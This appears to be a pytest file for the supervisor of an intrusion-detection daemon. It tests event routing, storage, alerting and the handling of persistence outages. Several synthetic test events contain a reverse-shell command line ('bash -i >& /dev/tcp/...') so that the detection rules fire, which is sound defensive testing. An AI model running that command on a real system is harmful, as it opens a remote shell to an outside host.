"""Tests for the supervisor."""

from __future__ import annotations

import io
import logging
import threading
import time
from datetime import UTC, datetime
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest

from inspectord.config import dev_config
from inspectord.parsers.base import build_event
from inspectord.schemas.event import Event, EventKind, Severity
from inspectord.storage.db import Database
from inspectord.supervisor import (
    PERSIST_FAILURE_ALERT_THRESHOLD,
    PERSIST_FAILURE_WINDOW,
    PersistFailed,
    Supervisor,
)


def test_supervisor_starts_and_routes_events(tmp_path: Path) -> None:
    cfg = dev_config(base=tmp_path)
    sup = Supervisor(cfg)
    sup.start()
    try:
        deadline = time.monotonic() + 3.0
        events: list[object] = []

        def collect(ev: object) -> None:
            events.append(ev)

        sup.attach_listener(collect)

        while time.monotonic() < deadline and not events:
            time.sleep(0.05)
        assert events, "supervisor did not deliver any events from healthcheck"
    finally:
        sup.stop(timeout=5.0)


def test_supervisor_persists_events_to_db(tmp_path: Path) -> None:
    cfg = dev_config(base=tmp_path)
    sup = Supervisor(cfg)
    sup.start()
    try:
        time.sleep(1.5)
    finally:
        sup.stop(timeout=5.0)

    with Database(cfg.storage.db_path) as db:
        rows = db.query("SELECT COUNT(*) FROM events_enriched").fetchall()
    assert rows[0][0] >= 1


def test_supervisor_journals_events(tmp_path: Path) -> None:
    cfg = dev_config(base=tmp_path)
    sup = Supervisor(cfg)
    sup.start()
    try:
        time.sleep(1.5)
    finally:
        sup.stop(timeout=5.0)

    assert any(cfg.storage.journal_dir.glob("*.jsonl.gz"))


def test_supervisor_starts_dependency_manager_worker(tmp_path: Path) -> None:
    cfg = dev_config(base=tmp_path)
    sup = Supervisor(cfg)
    sup.start()
    try:
        deadline = time.monotonic() + 5.0
        modules: set[str] = set()

        def listener(ev: object) -> None:
            modules.add(getattr(ev, "module", ""))

        sup.attach_listener(listener)

        while time.monotonic() < deadline and "dependency_manager" not in modules:
            time.sleep(0.1)
        assert "dependency_manager" in modules
    finally:
        sup.stop(timeout=5.0)


def test_supervisor_starts_log_tailer_and_fim_watcher(tmp_path: Path) -> None:
    cfg = dev_config(base=tmp_path)
    sup = Supervisor(cfg)
    sup.start()
    try:
        names = {wp.spec.name for wp in sup._procs}  # type: ignore[attr-defined]
        assert {"healthcheck", "dependency_manager", "log_tailer", "fim_watcher"} <= names
    finally:
        sup.stop(timeout=5.0)


def test_supervisor_fires_rule_and_notifies_listener(tmp_path: Path) -> None:
    cfg = dev_config(base=tmp_path)
    sup = Supervisor(cfg)
    sup.start()
    try:
        alerts_seen: list[object] = []

        def on_alert(a: object) -> None:
            alerts_seen.append(a)

        sup.attach_alert_listener(on_alert)

        # Wait briefly for setup, then inject a synthetic event.
        time.sleep(0.5)
        ev = build_event(
            module="process_collector",
            action="process_start",
            category=["process"],
            type_=["start"],
            severity="info",
            process={
                "pid": 9999,
                "name": "bash",
                "command_line": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
            },
        )
        sup._inject_for_test(ev)  # type: ignore[attr-defined]
        deadline = time.monotonic() + 3.0
        while time.monotonic() < deadline and not alerts_seen:
            time.sleep(0.05)
        assert alerts_seen, "rule did not fire after synthetic event"
    finally:
        sup.stop(timeout=5.0)


def test_supervisor_persist_projects_service_state(tmp_path: Path) -> None:
    cfg = dev_config(base=tmp_path)
    cfg.workers = []  # no subprocesses; we inject directly
    sup = Supervisor(cfg)
    sup.start()
    try:
        ev = Event(
            ts=datetime(2026, 6, 16, 12, 0, 0, tzinfo=UTC),
            event_id="svc-1",
            kind=EventKind.event,
            category=["configuration"],
            type=["change"],
            action="service_added",
            severity=Severity.info,
            module="services_monitor",
            service={"name": "cron.service", "state": "active"},
            raw={"source": "systemctl", "active": "active", "sub": "running", "load": "loaded"},
        )
        sup._inject_for_test(ev)
        deadline = time.monotonic() + 2.0
        rows: list = []
        while time.monotonic() < deadline:
            with Database(cfg.storage.db_path) as db:
                rows = db.query(
                    "SELECT active_state FROM service_state WHERE unit='cron.service'"
                ).fetchall()
            if rows:
                break
            time.sleep(0.05)
        assert rows == [("active",)]
    finally:
        sup.stop(timeout=5.0)


def test_supervisor_captures_evidence_on_high_alert(tmp_path: Path) -> None:
    cfg = dev_config(base=tmp_path)
    cfg.workers = []  # no subprocesses; we inject directly
    sup = Supervisor(cfg)
    sup.start()
    try:
        ev = Event(
            ts=datetime(2026, 6, 22, tzinfo=UTC),
            event_id="ev-1",
            kind=EventKind.event,
            category=["file"],
            type=["change"],
            action="file_modified",
            severity=Severity.info,
            module="fim_watcher",
            file={"path": "/etc/sudoers"},
        )
        sup._inject_for_test(ev)
        deadline = time.monotonic() + 3.0
        ev_rows: list = []
        while time.monotonic() < deadline:
            with Database(cfg.storage.db_path) as db:
                cases = db.query("SELECT case_id FROM cases").fetchall()
                if cases:
                    ev_rows = db.query("SELECT kind FROM case_evidence").fetchall()
                    if ev_rows:
                        break
            time.sleep(0.05)
        assert ev_rows, "expected case_evidence rows from the high-sev alert"
        kinds = {r[0] for r in ev_rows}
        assert "net_state" in kinds and "event_bundle" in kinds
    finally:
        sup.stop(timeout=5.0)


def test_supervisor_persist_projects_process_state(tmp_path: Path) -> None:
    cfg = dev_config(base=tmp_path)
    cfg.workers = []  # no subprocesses; we inject directly
    sup = Supervisor(cfg)
    sup.start()
    try:
        ev = Event(
            ts=datetime(2026, 6, 16, 12, 0, 0, tzinfo=UTC),
            event_id="proc-1",
            kind=EventKind.event,
            category=["process"],
            type=["start"],
            action="process_start",
            severity=Severity.info,
            module="process_collector",
            process={"pid": 4242, "name": "bash", "command_line": "bash -i"},
            user={"id": "1000"},
            raw={"source": "ebpf"},
        )
        sup._inject_for_test(ev)
        deadline = time.monotonic() + 2.0
        rows: list = []
        while time.monotonic() < deadline:
            with Database(cfg.storage.db_path) as db:
                rows = db.query("SELECT status FROM process_state WHERE pid=4242").fetchall()
            if rows:
                break
            time.sleep(0.05)
        assert rows == [("running",)]
    finally:
        sup.stop(timeout=5.0)


# --------------------------------------------------------------------------
# _dispatch: the one path every event takes (worker readers + monitor)
# --------------------------------------------------------------------------


def _reverse_shell_event() -> Event:
    """An event the starter pack alerts on, so the alert path actually runs."""
    return build_event(
        module="process_collector",
        action="process_start",
        category=["process"],
        type_=["start"],
        severity="info",
        process={
            "pid": 9999,
            "name": "bash",
            "command_line": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
        },
    )


def _state_event(event_id: str, pid: int) -> Event:
    """A process_start event the projector materializes into process_state."""
    return Event(
        ts=datetime(2026, 6, 16, 12, 0, 0, tzinfo=UTC),
        event_id=event_id,
        kind=EventKind.event,
        category=["process"],
        type=["start"],
        action="process_start",
        severity=Severity.info,
        module="process_collector",
        process={"pid": pid, "name": "bash", "command_line": "bash -i"},
        user={"id": "1000"},
        raw={"source": "ebpf"},
    )


def _fake_worker(lines: list[bytes]) -> Any:
    """A stand-in _WorkerProc whose stdout is a canned byte stream."""
    return SimpleNamespace(
        spec=SimpleNamespace(name="fake"),
        proc=SimpleNamespace(stdout=io.BytesIO(b"".join(line + b"\n" for line in lines))),
    )


def test_event_is_published_even_when_the_alert_path_raises(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
) -> None:
    """A failing rule/alert path must never swallow the event itself.

    alerts.dedup does a SELECT-then-UPDATE that can raise on a concurrent
    conflict; if that killed the publish, a security event would be lost
    entirely -- unstored, unprojected, invisible.
    """
    cfg = dev_config(base=tmp_path)
    cfg.workers = []  # no subprocesses; we inject directly
    sup = Supervisor(cfg)
    sup.start()
    try:

        def boom(_ev: Event) -> list[object]:
            raise RuntimeError("conflict on update!")

        monkeypatch.setattr(sup._rule_engine, "process", boom)
        seen: list[Event] = []
        sup.attach_listener(seen.append)

        ev = _reverse_shell_event()
        with caplog.at_level(logging.ERROR):
            sup._inject_for_test(ev)

        deadline = time.monotonic() + 3.0
        while time.monotonic() < deadline and not any(e.event_id == ev.event_id for e in seen):
            time.sleep(0.01)
        assert any(e.event_id == ev.event_id for e in seen), (
            "the event was dropped because the alert path raised"
        )
        assert "alert path failed" in caplog.text
    finally:
        sup.stop(timeout=5.0)


def test_worker_events_fan_out_alerts_on_the_reader_thread(tmp_path: Path) -> None:
    """Alert fan-out must stay on the thread that read the worker's line."""
    cfg = dev_config(base=tmp_path)
    cfg.workers = []
    sup = Supervisor(cfg)
    sup.start()
    try:
        threads: list[threading.Thread] = []
        sup.attach_alert_listener(lambda _a: threads.append(threading.current_thread()))

        ev = _reverse_shell_event()
        sup._read_stdout(_fake_worker([ev.model_dump_json().encode("utf-8")]))

        assert threads, "no alert fanned out for a worker-emitted event"
        assert all(t is threading.current_thread() for t in threads), (
            "alert fan-out moved off the reader thread"
        )
    finally:
        sup.stop(timeout=5.0)


def test_reader_survives_a_malformed_line_and_reports_it_accurately(
    tmp_path: Path, caplog: pytest.LogCaptureFixture
) -> None:
    cfg = dev_config(base=tmp_path)
    cfg.workers = []
    sup = Supervisor(cfg)
    sup.start()
    try:
        seen: list[Event] = []
        sup.attach_listener(seen.append)
        ev = _reverse_shell_event()
        with caplog.at_level(logging.ERROR):
            sup._read_stdout(_fake_worker([b"{not json", ev.model_dump_json().encode("utf-8")]))
        assert "emitted invalid event" in caplog.text

        deadline = time.monotonic() + 3.0
        while time.monotonic() < deadline and not any(e.event_id == ev.event_id for e in seen):
            time.sleep(0.01)
        assert any(e.event_id == ev.event_id for e in seen), (
            "a malformed line stopped the reader from dispatching the next one"
        )
    finally:
        sup.stop(timeout=5.0)


# --------------------------------------------------------------------------
# _drain: one failing event must never take the persistence thread with it
# --------------------------------------------------------------------------


def test_drain_keeps_persisting_after_a_persist_failure(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
) -> None:
    """_persist raising must not kill the only thread that writes storage.

    event_id is a PRIMARY KEY, journal I/O can fail, the disk can fill. An
    unguarded raise here used to end persistence for the lifetime of the
    daemon -- silently, with everything else still running.
    """
    cfg = dev_config(base=tmp_path)
    cfg.workers = []
    sup = Supervisor(cfg)
    sup.start()
    try:
        real_persist = sup._persist  # type: ignore[attr-defined]

        def flaky(ev: Event) -> None:
            if ev.event_id == "poison-1":
                raise RuntimeError("disk full")
            real_persist(ev)

        monkeypatch.setattr(sup, "_persist", flaky)

        with caplog.at_level(logging.ERROR):
            sup._inject_for_test(_state_event("poison-1", 5551))
            sup._inject_for_test(_state_event("good-1", 5552))

        deadline = time.monotonic() + 5.0
        rows: list = []
        while time.monotonic() < deadline:
            with Database(cfg.storage.db_path) as db:
                rows = db.query("SELECT status FROM process_state WHERE pid=5552").fetchall()
            if rows:
                break
            time.sleep(0.05)
        assert rows == [("running",)], (
            "the event after the failing one was never persisted -- the drain thread died"
        )
        assert "failed to persist" in caplog.text
    finally:
        sup.stop(timeout=5.0)


def test_drain_reports_a_persistent_persistence_outage(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A streak of failures is surfaced as an event, not only logged to a file."""
    cfg = dev_config(base=tmp_path)
    cfg.workers = []
    sup = Supervisor(cfg)
    sup.start()
    try:

        def always_fails(_ev: Event) -> None:
            raise RuntimeError("disk full")

        monkeypatch.setattr(sup, "_persist", always_fails)
        seen: list[Event] = []
        sup.attach_listener(seen.append)

        for i in range(PERSIST_FAILURE_ALERT_THRESHOLD):
            sup._inject_for_test(_state_event(f"poison-{i}", 5600 + i))

        deadline = time.monotonic() + 5.0
        while time.monotonic() < deadline and not any(
            e.action == "persistence_failing" for e in seen
        ):
            time.sleep(0.05)
        outage = [e for e in seen if e.action == "persistence_failing"]
        assert outage, "a dead persistence layer was never reported to the user"
        assert outage[0].severity is Severity.high
        assert outage[0].raw["failures"] == PERSIST_FAILURE_ALERT_THRESHOLD
        assert outage[0].raw["window"] >= outage[0].raw["failures"]
    finally:
        sup.stop(timeout=5.0)


def _wait_for_action(seen: list[Event], action: str, *, count: int, timeout: float) -> int:
    """Block until ``seen`` holds ``count`` events with ``action``; return how many."""
    deadline = time.monotonic() + timeout
    while True:
        got = sum(1 for e in list(seen) if e.action == action)
        if got >= count or time.monotonic() >= deadline:
            return got
        time.sleep(0.02)


def test_drain_does_not_alert_on_a_one_off_persist_failure(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """One duplicate event_id or transient DuckDB conflict stays a log line."""
    cfg = dev_config(base=tmp_path)
    cfg.workers = []
    sup = Supervisor(cfg)
    sup.start()
    try:
        real_persist = sup._persist  # type: ignore[attr-defined]

        def flaky(ev: Event) -> None:
            if ev.event_id == "poison-1":
                raise RuntimeError("duplicate event_id")
            real_persist(ev)

        monkeypatch.setattr(sup, "_persist", flaky)
        seen: list[Event] = []
        sup.attach_listener(seen.append)

        sup._inject_for_test(_state_event("poison-1", 5700))
        good = 2 * PERSIST_FAILURE_WINDOW
        for i in range(good):
            sup._inject_for_test(_state_event(f"good-{i}", 5701 + i))

        assert _wait_for_action(seen, "process_start", count=good + 1, timeout=10.0) == good + 1, (
            "the drain never worked through the injected events"
        )
        assert not [e for e in seen if e.action == "persistence_failing"], (
            "a single unlucky event must not be reported as a persistence outage"
        )
    finally:
        sup.stop(timeout=5.0)


def test_drain_reports_a_sustained_partial_persistence_outage(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Half the events failing forever never forms a streak -- and is still an outage.

    A streak counter that one success resets can be held at zero forever by a
    systematic 9-fail/1-success pattern while most of the security telemetry is
    dropped. That silent partial loss is exactly what has to be surfaced.
    """
    cfg = dev_config(base=tmp_path)
    cfg.workers = []
    sup = Supervisor(cfg)
    sup.start()
    try:
        real_persist = sup._persist  # type: ignore[attr-defined]

        def flaky(ev: Event) -> None:
            if ev.event_id.startswith("poison-"):
                raise RuntimeError("disk full")
            real_persist(ev)

        monkeypatch.setattr(sup, "_persist", flaky)
        seen: list[Event] = []
        sup.attach_listener(seen.append)

        # Strict alternation: the consecutive-failure count never exceeds one.
        for i in range(PERSIST_FAILURE_ALERT_THRESHOLD + 2):
            sup._inject_for_test(_state_event(f"poison-{i}", 5800 + i))
            sup._inject_for_test(_state_event(f"good-{i}", 5900 + i))

        assert _wait_for_action(seen, "persistence_failing", count=1, timeout=10.0) >= 1, (
            "half of every event being dropped was never reported to the user"
        )
        outage = [e for e in seen if e.action == "persistence_failing"]
        assert outage[0].severity is Severity.high
        assert outage[0].raw["failures"] >= PERSIST_FAILURE_ALERT_THRESHOLD
        assert outage[0].raw["window"] <= PERSIST_FAILURE_WINDOW
    finally:
        sup.stop(timeout=5.0)


def test_drain_reports_a_continuing_outage_only_once(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The alert must not re-fire on every failure while persistence stays down.

    persistence_failing is itself an event: it goes back through the router into
    this same drain loop and fails to persist like everything else. A trigger
    that can fire on each failure would therefore feed itself.
    """
    cfg = dev_config(base=tmp_path)
    cfg.workers = []
    sup = Supervisor(cfg)
    sup.start()
    try:

        def always_fails(_ev: Event) -> None:
            raise RuntimeError("disk full")

        monkeypatch.setattr(sup, "_persist", always_fails)
        seen: list[Event] = []
        sup.attach_listener(seen.append)

        total = 5 * PERSIST_FAILURE_ALERT_THRESHOLD
        for i in range(total):
            sup._inject_for_test(_state_event(f"poison-{i}", 5600 + i))

        assert _wait_for_action(seen, "process_start", count=total, timeout=10.0) == total, (
            "the drain never worked through the injected events"
        )
        # Give any surplus alert time to come back around through the router.
        _wait_for_action(seen, "persistence_failing", count=2, timeout=1.0)
        outage = [e for e in seen if e.action == "persistence_failing"]
        assert len(outage) == 1, f"{total} failures produced {len(outage)} alerts, expected 1"
    finally:
        sup.stop(timeout=5.0)


def test_persist_tags_which_stage_failed(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """_persist journals first and independently, so the two stages differ.

    A DuckDB failure (disk full, PK conflict) still leaves the event in the
    journal; only a journal failure loses it outright.
    """
    cfg = dev_config(base=tmp_path)
    cfg.workers = []
    sup = Supervisor(cfg)
    sup.start()
    try:
        journalled: list[dict[str, Any]] = []
        monkeypatch.setattr(sup._journal, "append", journalled.append)

        def boom(*_args: Any, **_kwargs: Any) -> None:
            raise RuntimeError("disk full")

        monkeypatch.setattr(sup._db, "execute", boom)
        with pytest.raises(PersistFailed) as db_failure:
            sup._persist(_state_event("db-fail-1", 5990))
        assert db_failure.value.stage == "database"
        assert [r["event_id"] for r in journalled] == ["db-fail-1"], (
            "the journal write happens first and must not be skipped by a DB failure"
        )

        monkeypatch.setattr(sup._journal, "append", boom)
        with pytest.raises(PersistFailed) as journal_failure:
            sup._persist(_state_event("journal-fail-1", 5991))
        assert journal_failure.value.stage == "journal"
    finally:
        sup.stop(timeout=5.0)


def test_persistence_outage_message_does_not_overstate_the_failure(tmp_path: Path) -> None:
    """A DuckDB-only outage must not be reported as the journal being down too."""
    cfg = dev_config(base=tmp_path)
    cfg.workers = []
    sup = Supervisor(cfg)
    sup.start()
    try:
        seen: list[Event] = []
        sup.attach_listener(seen.append)

        sup._report_persistence_down(10, 20, PersistFailed("database", RuntimeError("disk full")))
        sup._report_persistence_down(10, 20, PersistFailed("journal", OSError("read-only fs")))
        assert _wait_for_action(seen, "persistence_failing", count=2, timeout=10.0) == 2

        outage = [e for e in seen if e.action == "persistence_failing"]
        by_stage = {e.raw["stage"]: e for e in outage}
        assert set(by_stage) == {"database", "journal"}

        db_msg = by_stage["database"].message or ""
        assert "the journal still has them" in db_msg, (
            f"a database-only failure claimed the journal was down too: {db_msg!r}"
        )
        journal_msg = by_stage["journal"].message or ""
        assert "neither the journal nor the database" in journal_msg
    finally:
        sup.stop(timeout=5.0)
